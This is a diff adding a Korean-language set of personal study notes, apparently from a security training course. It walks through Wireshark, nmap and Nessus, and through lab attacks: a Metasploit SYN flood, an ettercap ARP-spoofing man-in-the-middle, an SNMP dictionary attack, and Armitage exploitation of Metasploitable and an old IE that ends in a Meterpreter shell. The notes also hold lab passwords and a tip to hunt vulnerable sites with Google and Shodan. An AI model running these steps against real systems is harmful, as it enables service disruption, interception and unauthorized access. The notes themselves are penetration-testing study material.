@@ -1,0 +1,550 @@
+1. 네트워크 패킷 보는 프로그램 
+	1. VisualRoute 평면 지구본! 그리고 패킷이 어떻게 가는지 보이는것!
+	
+	2. Open Visual TraceRoute 원형지구본 지구에서는 이게 더 잘보이고 패킷자체는 1번이 더 좋은것같음. 
+	
+	3. 와이어샤크 	패킷 스니핑 프로그램 
+		[참고] 와이어샤크
+			MAC주소 뒤에 괄호는 원래 괄호인데 앞에 내용으로 바꿔서 쓴것임 ()내용이 원래내용
+			핑을 줄때 윈도우로하면 윈도우는 반대로 브로드캐스트해서 자기도 MAC주소를 확인해 본다 						
+			와이어샤크의 2번째 창에서 대괄호 안은 프로그램이 해석한 것으로 실제적으로 있는것이 아님
+			와이어샤크를 연다 -> 오른쪽 밑에 프로파일 우클릭 -> 매니저 -> add하고 새로운 ktproject -> 적용된걸 확인
+			왼쪽 위에 Edit클릭 -> 맨밑 프리페어런스 클릭 -> user interfac -> columns -> add 하고 srcport,desport 하고 각각 파일 타입을 송신포트(unresolved) 수신포트(unresolved) 하기
+
+		* unresolved 는 이름안나오고 그대로나오는것, resolved는 이름으로 나옴
+
+		* 필터링
+			! nbns && ! ntp && ! ip.addr == 224.0.0.252 && ! dns && ! igmp && ! dhcpv6 해서 arp만 남기기 
+			icmpv6.type == 135
+			http.request.method == GET
+			icmpv6
+			icmpv6.type == 135
+			icmpv6.type == 136
+			필터링
+				 처음으로 프로토콜 쓰는게 좋음
+				 다음으론 IP
+				 다음으론 포트
+				 다음으론 특성 (특정 부분에 우클릭해서 필터링에 조지는것)
+				 다음으론 검색어조건(네이버가 들어간것만)
+				 다음으론 잘 모르는것은 알고있는것을 배제하는것 
+
+        시컨스번호와 아이피이름 설정하는법
+			시컨스번호 -> 우클릭 -> protocolpreferences -> relative sequence numbers
+			아이피 이름은 우클릭->edit resolved named 클릭후 위에 아이피 설정후 이름 정하기 -> view에서 name resolution -> resolve network Address 체크 !
+		
+		한세션 전체보기
+			우클릭 -> follow -> tcp stream  -> 이후 왼쪽 밑은 가는거나 오는거 선택가능 
+												그 옆은 보는 방식
+												그 옆은 다음세션 보는것 
+		[참고] browser 는 윈도우가 사용 
+			공유된 리소스 검색하는것임 SMB처럼 공유된 서버를 검색하는것인데 이렇게 검색할때 사용 하는것이 browser임 netbios에서 사용 
+		
+		[참고] SSDP 는 네트워크 서비스나 정보를 찾기 위해서 사용하는 네트워크 프로토콜 
+			네트워크 상에 물려있는 장치를 찾을때 쓰는것임 장비가 붙으면 멀티캐스트해서 서버의 장비들이 서로 붙어있는것을 확인할수잇음
+		
+		공식사이트 
+			● http://www.wireshark.org
+			
+		샘플 캡쳐 
+			● https://wiki.wireshark.org/SampleCaptures 
+		
+		사용법 
+			● https://www.wireshark.org/docs/wsug_html_chunked/
+			
+		패킷트레이서 실행후 원하는 패킷필터링하려면 우클릭후 필터 필드 레퍼런스 누르기 
+		
+		명령어 라인 툴 
+			● tshark	터미널 기반 wireshark(Terminal-based Wireshark)
+			● tcpdump	패킷 캡쳐(Capturing with tcpdump for viewing with Wireshark)
+			● dumpcap	패킷 캡쳐(Capturing with dumpcap for viewing with Wireshark)
+			● capinfos	패킷 캡쳐 파일 정보(Print information about capture files)
+			● rawshark	낮은 레벨 패킷 캡쳐(Dump and analyze network traffic.)
+			● editcap	캡쳐 파일 편집(Edit capture files)
+			● mergecap	파일 합치기(Merging multiple capture files into one)
+			● text2pcap	ASCII Hexdumps to pcap 파일 형태(Converting ASCII hexdumps to network                captures)
+			● idl2wrs	Corba IDL 파일에서 디코더 생성(Creating dissectors from CORBA IDL files )
+			● ngrep 	네트워크 그랩
+		
+		기본창 영역
+			캡쳐부분
+				인풋 : 로컬영역연결 누르고 BPFs보면 메모리상에 있는걸 볼 수 있음 
+				아웃풋 :
+					저장장소임 
+					pcapng는 넥스트제네레이션으로 확장판임
+					pcap은 호환성을 두려면 이걸 써야함
+					create a new file 자동 
+						이거 하면 크기가 이상될때마다 저장장소에 자동으로 저장됨
+				옵션 : 
+					저장장소를 정하고 옵션으로 관리함
+					Name Resolution : 이름을 보여주는옵션
+					Display Options	: 자동으로 화면을 보여줌 (ex : 새로운 패킷잡히면 스크롤 자동으로 내리기 등등)
+					
+		필터링예제
+			캡쳐 옵션(패킷을 보기 전에 필터링 할것이냐)
+				port 80 and port 53		-> 이것만잡힘 시작전에 입력하는것
+			디스플레이필터(패킷을 다 잡고 내가 알아서 필터링)
+		
+		패킷캡쳐 영역
+			-상태바에서 우클릭으로 없애거나 표시할 수 잇음 
+			-맨 왼쪽 밑에 상태바는(동그라미색) 누르면 상태를 볼 수 있음 오류는 빨간색
+				누르고 오른쪽 show부분 봣을때 특정 부분만 볼 수 잇음
+				상태바 오른쪽에 profile은 우클릭 좌클릭이 다름 
+					좌클릭은 원하는 것으로 누르면됨
+					우클릭은 좌클릭했을때 원하는것만 보기위해 내용을 만드는것 
+						매니저 프로파일
+							->원하는거만들기
+							->파란색하면 경로를 볼수있음
+		
+		상단 메뉴 부분
+			file
+				-merge 합칠때 		 	 -> 패킷 저장후 합쳐야함 (앞이나 뒤 또는 가운데에 붙일 수 있음)
+
+				-importfrom hex dump 	 -> 맨 밑에 패킷바이트 부분을 디테일창이나 패킷창 처럼 만들어줌
+
+				-export Specified packet -> 내보내기 
+					선택된 패킷을 내보낸다.
+					밑에 세부설정에 allpackets은 전부 다 보내는것이다(전체패킷)
+					캡쳐는 캡쳐된거
+					디스플레이는 보여지는것 
+					마킹을 하면 설정이 또 바껴있음 
+						first to last marked 첫부분부터 마지막 마크까지 내보내기
+						range는 범위를 지정 
+				
+				-export Packet Dissections -> 원하는 방식으로 내보낼 수 있음
+					text(메모장),csv(엑셀,콤마로구분된파일),C array 방식(C언어형식)
+					패킷을 선택후 우클릭해서 copy로가서 텍스트형식으로도 받을 수 있음
+
+				-export Objects		-> 파일을 복원할 때 사용???
+			
+			edit
+				-copy
+				
+				-find packet(ctrl+F)
+				-find Next(ctrl+N)
+				-find Previous(ctrl+B)
+				
+				-Mark/Unmark Packet(ctrl+M)
+				-Mark All Displayed(ctrl+shift+M)
+				-Next Mark(ctrl+shift+N)
+				-Previous Mark(ctrl+shift+B)
+				
+				-Packet Comment(ctrl+alt+C)	패킷의 코멘트달기 
+				-Preferences 
+					Appearance : 크기이상가면 자동으로 넘어가는 패킷은 this folder 에 위치 지정해주기!
+						Columns
+							MAC과 PORT 지정해주면 좋음 
+							버튼위치도 지정할 수 있음
+							[참고]SAN는 스토리지 어드레스 네트워크로 VSAN은 해당 SAN의 가상네트워크임
+						Font and Color
+							색의 변환 을 할 수 있는 부분 
+						Layout
+							메인페이지의 모양 바꾸는것 
+					
+					Capture
+						패킷 캡쳐의 내용을 볼 수 있는곳
+					
+					Name Resolution
+						이름의 변환값임 계속 저장되는것 그냥 메인창에서 하는 것은 일시적인것임 
+						Only use the profiles "hosts"file 체크하고
+							Resolve network addresses 체크하고
+							메인페이지에서 help에서 about wireshark 그리고 personal configuration 경로 들어가서 hosts파일 만들고 정의하면 해당 아이피에 이름이 적용됨 
+							ex) 192.168.20.201 win2008
+					
+					protocols
+						SSL이나 TSL에서 키값을 입력할때 사용 했었음 
+						해당 프로토콜의 포트번호를 변경가능
+					
+					RSA KEYs
+						SSH에서 사용하는 키 파일을 등록하는것 하지만 완벽하게 복원되진 않음 (파일형태 OR PKCS여야함)
+			
+			VIEW			
+				-Time Display Format 이거는 외국패킷을 분석할때 기준시간으로 사용해야함 (한국은 UTC +9시간)
+					초단위 밀리세컨드
+					날짜 time of day
+				
+				-ZOOM
+					크기 확장 또는 축소 
+					
+				-Colorize Packet List
+					패킷의 색 표시
+				
+				-Coloring Rules 
+					패킷분석할때 색표시후 원하는 패킷을 분석함 (+누른후)
+						NAME : TestRule		Filter : !arp && !dhcp && !dns && !nbns && ip.addr==192.168.20.201
+				
+				-Colorize Conversation
+					패킷 흐름 보기
+				
+				-Reset Layout 
+					초기화
+			
+			GO
+				-Go to Packet
+					패킷번호 쓰기 
+			
+			Capture
+				-capture filter	- web mail 등등 분석할 수 있는 필터링을 만들어 놨다가 불러다가 사용
+					등록 : +누른후 ex) NAME : TEST WEB		Filter : port 80 or port 443 or port 53
+					등록 : +누른후 ex) NAME : TEST MAIL		Filter : port 25 or port 110 or port 143 or port 53
+						시작 오른쪽 3번째에 동그라미 눌러서 필터링 부분 녹색 띠 누르면 사용가능
+					
+					프로토콜(Protocol) : ether, arp, rarp, ip, tcp, udp 등
+						(기본값) 프로토콜의 지정이 없으면 모든 프로토콜
+					방향(Direction) : src, dst, src and dst, src or dst 등
+						(기본값) 방향의 지정이 없으면 src or dst 모두
+					호스트(Hosts) : net, port, host, portrange 등
+						(기본값) 호스트의 지정이 없으면 모든 호스트
+			
+			Analyze
+				-Display Filters
+					필터링 룰을 모르면 디테일 창에서 우클릭후 Apply as Filter 에서 Select 하기
+					우클릭후 Decode As 하면 http를 https로 잘못검색된것을 잡을 수 있음 한번하면 계속 적용 따라서 파일을 지워줘야함
+		
+			Statistics(핵심)
+				-Capture File Properties : 체크섬값 등이 있음 분석요구를 받았을때 하나는 복제하고 복제한걸로분석해야함 
+					패킷잡은시간, 등등 필요한것들이 많음
+				
+				-Resolved Addresses : IP와 도메인, 포트와 이름등이 나열되어 있음 
+				
+				-Protocol Hierarchy : 프로토콜이 얼마나 차지하고 있는지를 나타냄 
+				
+				-Conversations : 프로토콜이 송신수신할때 보내는 패킷의 양적인 부분을 볼 수 있음 
+					Conversations Type 에서 원하는 것만 표기를 할 수 있음 
+					Follow Stream 으로 스트림 보기 가능
+					Graphic 으로 그래프로 볼 수 있음
+					
+				-endpoints : 패킷의 끝점을 볼 수 있음
+			
+				-Packet Lengths : 패킷의 길이를 나타냄
+					퍼센트 부분이 해당 길이의 차지비율
+					
+				-IO Graphs : 입출력 그래프를 나타냄 
+					추가하기 192.168.20.201 의 패킷그래프를 나타냄 
+					시간을 선택할 수 있고 그래프의 저장도 좋음 
+				
+				-HTTP : HTTP의 통신방식에 대한 비율도 알 수 있음
+				
+				이렇게 보면서 패킷필터링하고 이 Statistics의 비율을보고 특정 부분을 탐색한다
+				
+			Tools
+				-Firewall ACL Rules : 방화벽 정책을 넣어서 패킷이 필터링 되는지 안되는지 확인이 가능
+			
+			Help
+				-Contents : 도움을 받을 수 있음
+				
+				-Manual pages : 필터링 구문을 볼 수 있음
+				
+				-About Wireshark : 버전확인
+					폴더부분 설정 가능 
+					
+			필터링옆에부분 
+				Expression 누르면 패킷필터링 문법 볼 수 있음
+				옆에 + 는 패킷필터링을 많이 만들어 놓는것 
+					Lable = Test Web	Filter = ip.addr==192.168.20.201 && tcp.port==80 && tcp.port==53
+					Comment = Web Filterling 
+			
+			
+		
+		
+		
+		
+		
+	4. VPN은 아무거나 막 쓰면 안됨
+		- 무료로 쓰는 것이지만 사용하려면 정보를 등록한다 무료는 이런정보를 팔음 유료형태가 좋음 아니면 굉장히 유명한 툴 쓰기 
+	
+	5. 웹 모의해킹팀은 프록시보다 vpn을 쓰는게 속도가 더 빠름 
+	
+	6. 네트워크마이너 윈도우에서 사용가능	패킷을 추출하는데 최고임.
+		네트워크 포렌식에 주로 많이사용	-> 파일을 복원하는데 아주 유리함
+		
+	7. tcpdump 리눅스 기존내장 툴 
+		텍스트와 GUI프로그램 섞어서 잘 써야함 
+
+		
+2. 포트스캐닝
+	1. nmap 윈도우 툴 nmap.org에서 하면됨
+		1. 타겟에 ip적고 프로파일을 퀵스캔 그리고 돌리기 
+		[참고] 타겟부분이 안눌리면 새로 열어서 해야함 버그임
+	
+	2. advanced port scanner download	설치!
+		같이 열린포트 확인하는 툴 
+		
+		
+3. 메타스플로잇 
+	# wireshark &	-> eth1 내부망 선택
+							# netstat -antp | grep :5432
+							안뜬다.
+							# systemctl enable postgresql
+							# systemctl start postgresql
+							# msfconsole
+								> show -h		명령어 사용법나옴
+								> show auxiliary	코드들이 나온다 
+								> use auxiliary/dos/tcp/synflood 	이걸사용한다
+								> show options 		옵션 보기 	Current Setting 없으면	Required   예스여도 안됨
+								> set RHOST 192.168.20.200 	따라서 RHOST 부분에 이걸채워줌
+								> show options
+								> run		하면 와이어샤크에 잡힘
+							SYN 이 여러번 보내는걸 알 수 있다 IP도 이상한 IP임 
+
+4. ettercap		
+	중간자공격의 기본!
+		사용시스템 : 칼리(공격자) 리눅스200(ftp서버) win2008(ftp클라)
+			사용툴 : ettercap (리눅스 spooing 툴임 이후에 많은 기능이 내장 -G옵션하면 gui방식임)
+					 아벨 & 카인? (윈도우 spooing 툴임)
+			(칼리)
+				1. 와이어샤크 실행
+				2. # ettercap -G & 
+					Sniff > Unified sniffing > eth1  해서 이더넷 잡기 
+					Hosts > Scan fo hosts			 스캔 해보기
+					Hosts > Host list				 스캔 한거 가져오기 -> 안나옴 툴에 문제 
+				3. Ettercap 0.8.2 Bug Fix			 툴에 버그있음!!
+					증상 : Scan for host 실행	-> 주변 호스트 검색 X
+					해결 : 밑에 방법 참조 
+						(ㄱ)ettercap 0.8.3 (2019.1.1)	=> https://ettercap-project.org 에 오류가 있다고 나와있음 
+						(ㄴ)검색 호스트를 파일로 만들어서 load 하여 사용
+							# cd
+							# nmap -F 192.168.20.200
+								-> 192.168.20.200
+								-> 192.168.20.201 
+									이 둘의 IP와 MAC가 필요함 
+							# vi hostlist.txt	에 등록 
+								192.168.20.200	00:0c:29:e9:84:bf	linux200
+								192.168.20.201	00:0c:29:c4:e5:d6	win2008
+				4. # ettercap -G &
+					Sniff > Unified sniffing > eth1  해서 이더넷 잡기 
+					Hosts > Scan fo hosts			 스캔 해보기
+					Hosts > Host list				 스캔 한거 가져오기 -> 안나옴 툴에 문제 
+					Hosts > Host from file			 hostlist.txt 
+					200 번을 target 1로
+					201 번을 target 2로 		
+				5. 와이어샤크 실행 
+				6. 4번에서 mitm에서 sniff remote connections하기
+				7. 와이어샤크 보기 -> 스푸핑작업인것을 확인
+			(윈2008)
+				1. arp -a	칼리랑 리눅스200 mac같은지 확인
+				2. ftp 192.168.20.200		-> 포워딩을 안해서 연결이 안됨 툴에 또 문제가 있어서!
+				3. 다시 수동명령어로 전환!
+				
+5.onesixtyone
+	사전파일 대입 공격 
+	# cd /usr/share/doc/onesixtyone 	사전파일
+	5. # onesixtyone -c dict.txt 192.168.20.200 	-C파일이름 대상은 200	dict.txt 파일은 기본 벤더들이 사용하는 명령어들이 모여있는것 
+	
+6.snmp-check	
+	상대편 자원을 얻어 옴 
+		
+7.IDS센서(SecurityOnion) 여기에 넣으면 자동으로 분석을 해 줌 
+
+8. SolarWins
+http://www.solarwinds.com/network-topology-mapper -> 네트워크 토폴로지를 자동으로 그려주는 툴임 아주 좋다 
+												  -> 관리자일 경우 아주쉬움
+												  -> but 우리는 관리자가 아니라서 traceroute 를 이용해 수동으로 조져야함 
+
+9. zenmap &
+	-타겟 : 192.168.20.0/24	프로파일 : quick scan plus 로 돌리기!
+	-profile -> new profile or command -> 편집창 나옴
+		profile : 이름과 설명작성
+		scan    : 옵션과 타겟을 지정한다
+		ping    : 핑옵션 설정
+		-> 저장
+		프로파일에 위에서 저장한거 스캔가능함		
+		
+10. dnmap		
+		
+11. nessus 
+	ex : 우분투 취약점 점검 
+		[Ubuntu 점검] 172.16.6.251
+			policies -> 오른쪽 위 new policy -> advanced
+			(setting)
+				Name : Ubuntu804_01
+				왼쪽 나머지는 다 기본값
+			(credentials)
+				카테고리 : host
+				그 밑에 ssh선택
+					오른쪽에 열리게됨 
+					Authentication method : password
+					username : root
+					password : soldesk1. 
+				카테고리 : db
+					db type : postgresql
+					authtype : password
+					username : postgres
+					password : postgres
+			(plugins)
+				점검할 항목들을 선택
+			
+			밑에 세이브 클릭 그러면 하나가 생성된것을 확인
+			
+			왼쪽위에 my scans -> 오른쪽위 new scan -> 위에 userdefined -> win2008R2_01 선택(특정policies에 대해 타겟을 정함)
+				(general)
+					name			: Ubunto804_01_01
+					description		: 2019.12.05 samsung project
+					folder			: 기본값
+					targets			: 172.16.6.251 여러개 지정가능 우리는 16개까지 가능 돈주고 안사서 
+				(schedule)
+					자동으로 돌릴것이냐
+				(notifications)
+					이메일에 넣으면 자동으로 돌리고 이메일로 보내줌 
+			
+			밑에 세이브 클릭 그러면 하나 생성된것 확인 -> 재생모양클릭
+		
+		다 하고 오른쪽 위 report 누르기 -> html -> custom -> 생성
+
+12. Armitage 툴 사용하기
+		사용시스템
+			Metasploitable V2 Linux (192.168.10.134)
+			Windows7 (192.168.20.100)
+			Firewall (192.168.10.100/192.168.20.100)
+			KaliLinux(192.168.10.50/192.168.20.50)
+		(칼리)
+			# armitage & 
+				help -> homapage -> www.fastandeasyhacking.com -> manual 정보를 읽기
+				Connect 
+				예
+			# cd /usr/share/metasploit-framework
+			# ls 	-> msfrpcd 가있다 이것이 기동되어야 아미티지 사용 쌉가능
+		(아미티지)
+			(왼쪽위에 모듈)
+				msf체계에 붙었으니 msf체계 모듈을 사용 가능 
+				왼쪽 검색에 synfood 하면 위에 뜸 들어가면 기호에 +가 있는게 있는데 이것은 꼭 넣어줘야함 그리고 런치하면 돌아감
+			(오른쪽 위가 타겟)
+				위에 호스트 창에서 호스트 추가 하고 nmap 스캔하고 msf 스캔하고 할수있음 -> nmpa 스캔 -> quick scan(os detect) -> 192.168.10.0/24 검색
+				134번 우클릭 -> services -> 사용하는 서비스 나옴 
+				134번 우클릭 -> scan -> 다시 스캔하는 작업을 함 
+				134번 우클릭 -> login -> ftp -> 대기
+		(메타스플로잇)
+			$ sudo useradd -m -s /bin/bash user1
+			$ sudo passwd user1
+		(아미티지)
+			user1
+			user1 으로 접속
+			134번 우클릭 -> host -> operating system -> 안드로이드로 바꾸기 -> 해당 아이콘이 바뀜 
+			134번 우클릭 -> host -> set label -> metasploit Version 2 -> 이름이 바뀜 
+			(맨 밑 탭창) -> 똑같이 사용할 수 있음 
+				search synflood 
+				use auxiliary/dos/tcp/synflood
+				show options
+				set RHOSTS 192.168.10.134
+				show options
+		(아미티지)
+			위에 호스트 -> nmap -> quick scan (os dected) -> 192.168.20.0/24
+			134 번 우클릭 -> 서비스 -> 살펴봄
+		(칼리)
+			# wireshark &
+				eth0 잡기 
+				!dns && !arp && ip.addr==192.168.10.134 && !browser && !nbns	-> 필터링 작성
+		(아미티지)
+			위에 armitage -> preferences -> 5번째 마지막꺼 poor로 바꾸기 
+			134번 우클릭 -> host -> operating system -> 리눅스로 바꾸기 -> 해당 아이콘이 바뀜 
+			위에attack -> find attack -> 하기 -> 우크릭하면 어택이 생김 : 
+				파인드 어택은 해당 서버에 공격을 할만한 코드들을 검색하는 것이다 공격은 아님 따라서 패킷에 안잡힘
+			우클릭 -> attack -> 여러 메뉴가 나옴 -> 아무거나선택 -> ftp -> check exploits : 
+				해당 ftp에 취약점(목록)에 대하여 점검작업을 함 이 점검작업은 check라는 함수가 코드마다 있는데 이는 
+				run과 다르다 check는 포트를 요청하면 상대편이 배너메시지를 주어 버전을 알게 되는 것이다 따라서 공격 가능성을 보는것
+				run은 공격을 하는것이다 run을하면 check를 돌리고 공격을 하는것이다 차이점이 있다!
+			우클릭 -> attack -> 여러 메뉴가 나옴 -> 아무거나선택 -> telnet -> check exploits : 
+			위에attack -> Hail Mary 는 findattack로 목록화를 시킨것을 가지고 어택하는 전체 메뉴 실행시켜 보는것이다 
+			하고나면 뚫림 번개 모양이 침
+			134 우클릭 -> shell -> 연결이 가능하다 -> interact 대화형, upload 파일업로드, post modules 모듈선택 -> interact선택 
+		(윈7)
+			IE 8 이하 버전 사용
+			IE 보안 설정이 낮음으로 설정된 상태
+		(아미티지)		
+			ms11_003_ie_css_import 선택후 -> 런치 
+				(예) http://192.168.10.50:8080/WcvnEB44pNCxq -> 이렇게 나온다 
+		(윈7)
+			http://192.168.10.50:8080/WcvnEB44pNCxq 에 검색
+		(아미티지)
+			쉘을 따냄 오른쪽 마우스 > Meterpreter 1/2 > Interact Explore > Screeshot
+
+13. gdb
+	■ 많이 사용되는 gdb command 모음
+		http://visualgdb.com/gdbreference/commands/
+		http://blog.kimtae.xyz/53
+
+14. buffer overflow site 
+	● http://www.hackerslab.org
+	● http://www.hackershool.org
+
+15
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+[직업!]
+op(1차처리) : 권한이 아주 조금 있음 -알람울리면 담당자에게 보고
+	-분석하는사람한테 넘겨주기(2차처리)----------------------------------------+
+																 | ------2차처리를 관리하는사람
+	-침해대응팀(2차처리)--------------------------------------------------------------+
+		공격이라고 판단하고 차단하는 설정 및 위치 정하기 
+		악성코드 분석가	등등
+
+이 모든걸 포함해서 관제서비스
+
+
+[참고] 소스코드 다운로드 받는 사이트
+	- code.google.com
+	- GitHub.com
+	- sourceforge
+
+[참고] 정보제공 사이트
+	https://www.exploit-db.com/google-hacking-database/
+	archive.org		-> 옛날 사이트를 캐싱해 놓은 사이트
+	www.shodan.io	-> 악의적인 검색을 캐싱해 놓은사이트(WEBCAM을 주로했었음)
+
+[참고] 윈도우 명령 또는 기능 보는 사이트 
+	technet.microsoft.com
+	docss.microsoft.com 
+	
+[면접] 30분안에 사이트 해킹해봐라
+	취약성있는 사이트를 찾기위해 구글링함
+	그다음으로 많이 사용하는게 shodan임 
+
+[대회]
+	리버싱 대회 
+		● (한국) CODEGATEhttp://www.codegate.org
+		● (미국) DEFCON CTFhttp://www.defcon.org/html/defcon-20/dc-20-ctf.html
+		● (일본) SECCON CTF http://www.seccon.jp
+	
+
+
+
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	
+	
